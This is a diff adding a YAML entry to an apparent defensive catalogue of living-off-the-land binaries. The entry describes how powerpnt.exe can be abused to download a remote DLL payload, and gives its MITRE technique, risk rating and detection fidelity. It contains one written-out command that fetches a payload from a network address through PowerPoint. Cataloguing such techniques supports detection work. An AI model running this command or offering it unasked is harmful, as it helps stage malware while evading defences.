@@ -1,0 +1,20 @@
+- command: Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+  description: Abuse powerpnt.exe to download a remote payload and store it in the cache folder.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/
+    - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
+  risk: High
+  risk_reason: Abuse of powerpnt.exe to download a remote file over the Internet is typically suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare for most organizations.
+  tool: powerpnt
+  threatactors:
+    N/A:
+      - N/A
